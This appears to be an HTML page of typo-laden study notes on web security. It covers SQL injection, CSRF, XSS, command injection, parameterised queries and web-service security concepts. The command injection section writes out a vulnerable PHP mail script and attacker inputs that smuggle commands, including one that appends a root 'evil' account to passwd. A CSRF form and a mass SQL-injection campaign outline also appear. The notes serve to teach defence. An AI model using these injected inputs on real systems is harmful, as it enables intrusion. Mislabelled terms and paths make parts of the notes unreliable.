 <html>
  <head>
  	<title>Web Security</title>
  </head>
  <body>
  
  
  <h1>Web Server</h1>
  <p>A Web Server is an entry point for clients to a variety of services. Customized for clients via cookies and  si supported by complex backend application such as databases.</p>
  
  <p>Attackers commonly target web servers through common, protocols. Web servers that suppports a wide range of inputs, complex software interactions and web servers runing with high privileges.</p>
  
  <h3> Three top web site vulnerabilities</h3>

  <p>SQl Injection</p>
    Browser sends malicious input to the server. Bad input chaking leads to maliciuos SQL query. Simpky saying that the SQL is used to  channge the meaning of th database command.
  <p>CSRF- Cross-site scripting</p>
  Bad website sends browsers request to good web site, using credentials of the innocent victim. Leverage user's session at victim server.
  <p>XSS- Cross-site scripting</p>
  bad website send innocent victim a script that steals information from an honest web site. Inject malicious script into trusted context.
  
  <h3>Command Injection</h3>
      <p>Attack goal: executes arbitary code o nthe server</p>
      <p>Example</p>
      <p><b>PHP server-sede code for sending mail</b></p>
      <p>$email = $_POST["emai"]</p>
      <p>$subject = $_POST["subject"]</p>
      <p>system(""mail $email - s $subject < /tmp/joinmynetwork"")</p>
      <p><b>Attacker can post</b></p>
      <p>http://yourdi=omain.com/mail.php?</p>
      <p>   email=hacker@hackerhome.net &</p>
      <p>   subject=foo < /usr/passwd; ls</p>
      <p><b>OR</b></p>
      <p>http://yourdomain.com/mail/php?</p>
      <p>email=hacker@hackerhome.net&subject=foo</p>
      <p>echo "evil::0:0:root:/:/bin/sh">>passwd; ls</p>
<h3>SQL Injection</h3>
      <p><b>Main steps in this attack;</b></p>
      <p>use google to find sites using a particular ASP style vulnerable to sql injection.</p>
      <p>use SQL injection on these sites to modify the pages to include a link to chinese sites nihaorr1.com (don't visit he site.)</p>
      <p>the site serves javasript that exploits vulnerabilitie in IE, RealPlayer, QQ Instant Messenger</p>
      
      <p>Pvention of sql injection</p>
      <p>never build SQL commands yourself</p>
      <p> use parametero=ized.prepared SQL</p>
      <p>use ORM framework</p>
      <p>example</p>
      <p>Build SQL queries by properly escaping args: ' \'</p>
      <p>SQlCOmmand cmd = new SQLCommand(</p>
      <p>"Select * FROM UserTable WHERE username = @User AND password= @Pwd", dbConnection</p>
      <p>cmd.Parameters.ADD("@User", Request["user"]);</p>
      <p>cmdParametes.ADD("@Pwd", Request["pwd"]);</p>
      <p>cmd.ExecuteReader();</p>
<h3>Cross Site Request Forgery</h3>
      <p>Example</p>
      <p>user logs in to bank.com</p>
      <p>Session cookies remians in browser state</p>
      <p>User visits another site containing:</p>
      <p>-form name=F action=http://bank.com/BillPay.php-<br>
        -input name=recipient value=badguy- â€¦<br>
        -script- document.F.submit(); -script-</p>
      <p>Browser send user auth cookies with request</p>
      <p>transaction will fulfilled</p>
      <p>Problem: cookies auth is insufficient when side effect occur</p>
 <h2>Web Servicce Security Concepts</h2>
      <ol>
        <li>Authentication</li>
          <table>
            <tr>Verfting the user is who she claims to be. A user's identtity is verified based on the  credentials presented by the user, such as:</tr>
              <tr>1. Something one has, for example, credentials issued by a trusted authority as passport or smart card.</tr>
              <tr>Something one knows, for example, password</tr>            
          </table>
          <li>Authorization(or acces Control)</li>
          <table>
            <tr>Granting acces to specific resources based on an authenticated user's entitlements. Entitlements are defined by one or several attributes. </tr>
              <tr>An attribute is the property of characteristic of a user.</tr>
          </table>
          <li>Confidentiality, privacy</li>
          <table>
            <tr>Keeping information secret. Accesses a message, for example a Web service request or an email, as well as the identity of the sending and receiving parties in a confidential manner. Confidentiality and privacy can be achieved by encrypting the content of a message and obfuscating the sending and receiving parties' identities</tr>
          </table>
          <li>Integrity, non repudiation</li>
          <table>
            <tr>Making sure that a message remains unaltered during transit by having the sender digitally sign the message. A digital signature is used to validate the signature and provides non-repudiation. The timestamp in the signature prevents anyone from replaying this message after the expiration.</tr>
          </table>
          <li>Oracle Web Services Manager (WSM)</li>
          <table>
            <tr>is designed to define and implement Web services security in heterogeneous environments, including authentication, authorization, message encryption and decryption, signature generation and validation, and identity propagation across multiple Web services used to complete a single transaction.</tr>
          </table>
          <li>SSL</li>
          <table>
          <tr>provides a secure communication channel, however, when the data is not "in transit," the data is not protected. This makes the environment vulnerable to attacks in multi-step transactions.</tr>
          </table>
          <li>SAML</li>
          <table>
            <tr> is one of the most interesting security tokens because it supports both authentication and authorization. SAML is an open framework for sharing security information on the Internet through XML documents. </tr>
          </table>
          <li>Role-based</li>
          <table>
            <tr>Role-based security is based on the notion that a set of identities, known as principals, can be grouped into roles, and then a policy can be applied to each of the roles</tr>
          </table>
          <li>Identity based</li>
          <table>
            <tr>dentity Model enables you to manage claims and policies in order to authorize clients. With this approach, you can verify claims contained within the authenticated users' credentials. </tr>
          </table>
          <li>Username Token</li>
          <table>
            <tr>A username token carries basic authentication information such as a username and password. When a username token is used with an authentication-only policy, no private keys are used. When used in a policy that includes authentication and message protection, the keys required for message protection are required.</tr>
          </table>
          <li>Kerberos Token</li>
          <table>
          <tr>A Kerberos token is comprised of a binary authentication and session token. When a kerberos token is used with an authentication-only policy, no private keys are used. When used in a policy that includes authentication and message protection, the keys required for message protection are required.</tr>
          </table>
   </ol>
  </body>
  </html>
